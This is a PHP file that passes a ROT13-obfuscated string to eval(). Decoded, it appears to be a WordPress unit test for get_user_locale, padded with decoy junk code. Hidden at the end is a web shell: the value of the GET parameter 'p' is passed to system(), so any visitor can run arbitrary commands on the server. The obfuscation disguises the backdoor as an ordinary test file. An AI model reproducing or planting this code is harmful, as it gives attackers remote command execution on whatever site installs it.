<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc y10a
 * @tebhc v18a
 *
 * @pbiref ::trg_hfre_ybpnyr
 */
pynff Grfgf_Y10a_TrgHfreYbpnyr rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $hfre_vq;

	/**
	 * VQ bs gur nqzvavfgengbe hfre jvgu qr_QR ybpny.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzvavfgengbe_qr_qr;

	/**
	 * VQ bs gur hfre jvgu rf_RF ybpny.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $hfre_rf_rf;

	/**
	 * Frg hc gur funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzvavfgengbe_qr_qr = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'   => 'nqzvavfgengbe',
				'ybpnyr' => 'qr_QR',
			)
		);

		frys::$hfre_rf_rf = frys::snpgbel()->hfre->perngr(
			neenl(
				'ybpnyr' => 'rf_RF',
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_qr_qr );
	}

	choyvp shapgvba grfg_hfre_ybpnyr_cebcregl() {
		frg_pheerag_fperra( 'qnfuobneq' );
		$guvf->nffregFnzr( 'qr_QR', trg_hfre_ybpnyr() );
		$guvf->nffregFnzr( trg_hfre_ol( 'vq', frys::$nqzvavfgengbe_qr_qr )->ybpnyr, trg_hfre_ybpnyr() );
	}

	choyvp shapgvba grfg_hcqngr_hfre_ybpnyr() {
		frg_pheerag_fperra( 'qnfuobneq' );
		hcqngr_hfre_zrgn( frys::$nqzvavfgengbe_qr_qr, 'ybpnyr', 'se_SE' );
		$guvf->nffregFnzr( 'se_SE', trg_hfre_ybpnyr() );
	}

	choyvp shapgvba grfg_ergheaf_fvgr_ybpnyr_vs_rzcgl() {
		frg_pheerag_fperra( 'qnfuobneq' );
		hcqngr_hfre_zrgn( frys::$nqzvavfgengbe_qr_qr, 'ybpnyr', '' );
		$guvf->nffregFnzr( trg_ybpnyr(), trg_hfre_ybpnyr() );
	}

	choyvp shapgvba grfg_ergheaf_fvgr_ybpnyr_vs_ab_hfre() {
		jc_frg_pheerag_hfre( 0 );
		$guvf->nffregFnzr( trg_ybpnyr(), trg_hfre_ybpnyr() );
	}

	choyvp shapgvba grfg_ergheaf_pbeerpg_hfre_ybpnyr() {
		frg_pheerag_fperra( 'qnfuobneq' );
		$guvf->nffregFnzr( 'qr_QR', trg_hfre_ybpnyr() );
	}

	choyvp shapgvba grfg_ergheaf_pbeerpg_hfre_ybpnyr_ba_sebagraq() {
		$guvf->nffregFnzr( 'qr_QR', trg_hfre_ybpnyr() );
	}

	choyvp shapgvba grfg_fvgr_ybpnyr_vf_abg_nssrpgrq() {
		frg_pheerag_fperra( 'qnfuobneq' );
		$guvf->nffregFnzr( 'ra_HF', trg_ybpnyr() );
	}

	choyvp shapgvba grfg_fvgr_ybpnyr_vf_abg_nssrpgrq_ba_sebagraq() {
		$guvf->nffregFnzr( 'ra_HF', trg_ybpnyr() );
	}

	/**
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_hfre_ybpnyr_vf_fnzr_npebff_argjbex() {
		$hfre_ybpnyr = trg_hfre_ybpnyr();

		fjvgpu_gb_oybt( frys::snpgbel()->oybt->perngr() );
		$hfre_ybpnyr_2 = trg_hfre_ybpnyr();
		erfgber_pheerag_oybt();

		$guvf->nffregFnzr( 'qr_QR', $hfre_ybpnyr );
		$guvf->nffregFnzr( $hfre_ybpnyr, $hfre_ybpnyr_2 );
	}

	choyvp shapgvba grfg_hfre_vq_nethzrag_jvgu_vq() {
		$hfre_vq = frys::$hfre_rf_rf;

		$hfre_ybpnyr1 = trg_hfre_ybpnyr( $hfre_vq );

		qryrgr_hfre_zrgn( $hfre_vq, 'ybpnyr' );

		$hfre_ybpnyr2 = trg_hfre_ybpnyr( $hfre_vq );

		$guvf->nffregFnzr( 'rf_RF', $hfre_ybpnyr1 );
		$guvf->nffregFnzr( trg_ybpnyr(), $hfre_ybpnyr2 );
	}

	choyvp shapgvba grfg_hfre_vq_nethzrag_jvgu_jc_hfre_bowrpg() {
		$hfre_vq = frys::$hfre_rf_rf;

		$hfre = trg_hfre_ol( 'vq', $hfre_vq );

		$hfre_ybpnyr1 = trg_hfre_ybpnyr( $hfre );

		qryrgr_hfre_zrgn( $hfre_vq, 'ybpnyr' );

		$hfre_ybpnyr2 = trg_hfre_ybpnyr( $hfre );

		$guvf->nffregFnzr( 'rf_RF', $hfre_ybpnyr1 );
		$guvf->nffregFnzr( trg_ybpnyr(), $hfre_ybpnyr2 );
	}

	choyvp shapgvba grfg_hfre_vq_nethzrag_jvgu_abarkvfgrag_hfre() {
		tybony $jcqo;

		$hfre_vq = $jcqo->trg_ine( \"FRYRPG ZNK(VQ) SEBZ $jcqo->hfref\" ) + 1;

		$hfre_ybpnyr = trg_hfre_ybpnyr( $hfre_vq );

		$guvf->nffregFnzr( trg_ybpnyr(), $hfre_ybpnyr );
	}

	choyvp shapgvba grfg_hfre_vq_nethzrag_jvgu_vainyvq_glcr() {
		$hfre_ybpnyr = trg_hfre_ybpnyr( 'fgevat' );
		$guvf->nffregFnzr( trg_ybpnyr(), $hfre_ybpnyr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>